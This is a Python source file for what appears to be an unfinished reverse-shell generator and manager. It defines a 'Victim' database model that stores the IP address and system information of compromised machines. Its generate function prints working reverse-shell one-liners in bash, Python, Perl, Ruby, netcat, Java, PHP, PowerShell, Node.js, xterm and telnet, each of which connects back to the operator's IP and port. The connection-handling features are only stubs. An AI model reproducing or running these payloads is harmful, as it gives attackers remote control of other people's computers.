import os
import time
import socket
import subprocess
from flask import Flask
from flask_sqlalchemy import SQLAlchemy

# Initialize Flask app (not necessary for database operations)
app = Flask(__name__)

# Configure database URI
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///llehs.db'

# Suppress deprecation warnings
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize SQLAlchemy object
db = SQLAlchemy(app)

# Define the Victim model
class Victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    nickname = db.Column(db.String(50))
    port = db.Column(db.Integer)
    ip = db.Column(db.String(15)) # The IP address of the victim machine-Get this when the reverse shell is generated
    startUpIp = db.Column(db.String(15)) # The IP address of the machine when the reverse shell was generated
    systemInfo = db.Column(db.String(100)) # The system information of the victim machine when the reverse shell was generated
    timeOfConnection = db.Column(db.DateTime)

# Create the application context
with app.app_context():
    # Create the database tables
    db.create_all()


# Listener and handler for one, multiple, or all shells
def listener():
    pass

# Generate reverse shell
def generate():
    port = input("Enter the port number: ")
    ip = socket.gethostbyname(socket.gethostname())

    while True:
        print("Your IP address is: " + ip)
        userVal =input("Is this the IP address you want to use? (y/n)")
        if userVal.lower() == "y":
            break
        elif userVal.lower() == "n":
            ip = input("Enter the IP address to use: ")
            break
        else:
            print("Invalid choice")
            continue
    
    while True:
        print("Choose category of script:")
        print("[1] - Our HoemBrew Script - recommended")
        print("[2] - Linux Basic Scripts")
        print("[3] - Personalized Script")
        userInput = input(": ")

        if userInput == "1":
            homeBrewScript(ip, port) # call homeBrewScript that we will make
            break

        elif userInput == "2":
            print("Choose a shell script:")
            print("[1] - Bash")
            print("[2] - Python")
            print("[3] - Perl")
            print("[4] - Ruby")
            print("[5] - Netcat")
            print("[6] - Java")
            print("[7] - PHP")
            print("[8] - Powershell")
            print("[9] - Node.js")
            print("[10] - xterm")
            print("[12] - telnet")
    
            userInput = input(": ")

            if userInput == "1" or userInput.lower() == "bash":
                print("bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1")
                break
            elif userInput == "2" or userInput.lower() == "python":
                print("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
                break
            elif userInput == "3" or userInput.lower() == "perl":
                print("perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")
                break
            elif userInput == "4" or userInput.lower() == "ruby":
                print("ruby -rsocket -e'f=TCPSocket.open(\"" + ip + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
                break
            elif userInput == "5" or userInput.lower() == "netcat":
                print("nc -e /bin/sh " + ip + " " + port)
                break
            elif userInput == "6" or userInput.lower() == "java":
                print("r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/" + ip + "/" + port + ";cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);p.waitFor()")
                break
            elif userInput == "7" or userInput.lower() == "php":
                print("php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
                break
            elif userInput == "8" or userInput.lower() == "powershell":
                print("powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"")
                break
            elif userInput == "9" or userInput.lower() == "node.js":
                print("node -e 'var net = require(\"net\"), sh = require(\"child_process\").exec(\"/bin/sh\"), client = new net.Socket();client.connect(" + port + ", \"" + ip + "\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'")
                break
            elif userInput == "10" or userInput.lower() == "xterm":
                print("xterm -display " + ip + ":" + port)
                break
            elif userInput == "11" or userInput.lower() == "telnet":
                print("telnet " + ip + " " + port + " | /bin/bash | telnet " + ip + " " + port)
                break
            else:
                print("Invalid choice")
                continue

        elif userInput == "3":
            print("work in progress") # prompt user for their own script | maybe a file upload pop-up
            break

        else:
            print("Invalid choice")
            continue

    
def homeBrewScript(ip, port):
    print("HomeBrew Script")
    print("work in progress")


# List all shells
def listShells():
    pass

# Manage shells
def manageShells():
    pass

# Help
def help():
    print("Help Menu")
    print("1. Connect - Connect to a reverse shell")
    print("2. Generate - Generate a reverse shell")
    print("3. List - List all reverse shells")
    print("4. Manage - Manage reverse shells")
    print("9. Help - Display this help menu")
    print("0. Exit - Exit the program")


if __name__ == "__main__":
    os.system("clear")
    print("Welcome to...\n")
    print(" $$\       $$\       $$$$$$$$\ $$\   $$\  $$$$$$\  \n",
          "$$ |      $$ |      $$  _____|$$ |  $$ |$$  __$$\ \n",
          "$$ |      $$ |      $$ |      $$ |  $$ |$$ /  \__|\n",
          "$$ |      $$ |      $$$$$\    $$$$$$$$ |\$$$$$$\  \n",
          "$$ |      $$ |      $$  __|   $$  __$$ | \____$$\ \n",
          "$$ |      $$ |      $$ |      $$ |  $$ |$$\   $$ |\n",
          "$$$$$$$$\ $$$$$$$$\ $$$$$$$$\ $$ |  $$ |\$$$$$$  |\n",
          "\________|\________|\________|\__|  \__| \______/ \n\n",
          "                            ","*pssst its shell in reverse x x\n",
          "                                                        "," U \n")
    print("Please select one:\n")
    print("[1] - [C]onnect")
    print("[2] - [G]enerate RS")
    print("[3] - [L]ist shells")
    print("[4] - [M]anage shells")
    print("[9] - [H]elp")
    print("[0] - [E]xit\n")
    while(True):
        try:
            userInput = input(": ")
            if userInput == "0" or userInput.lower() == "e" or userInput.lower() == "exit":
                print("GoodBye")
                break
            elif userInput == "1" or userInput.lower() == "c" or userInput.lower() == "connect":
                print("work in progress/1")
            elif userInput == "2" or userInput.lower() == "g" or userInput.lower() == "generate":
                generate()
            elif userInput == "3" or userInput.lower() == "l" or userInput.lower() == "list":
                print("work in progress/3")
            elif userInput == "4" or userInput.lower() == "m" or userInput.lower() == "manage":
                print("work in progress/4")
            elif userInput == "9" or userInput.lower() == "h" or userInput.lower() == "help":
                print("Help")
            else:
                print("WRONG")
                continue
        except KeyboardInterrupt:
            os.system("clear")
            time.sleep(2)
            print("Why you trying to leave...")
            time.sleep(2)
            print("YOUR STUCK HERE...")
            time.sleep(5)
            print("JK")
            break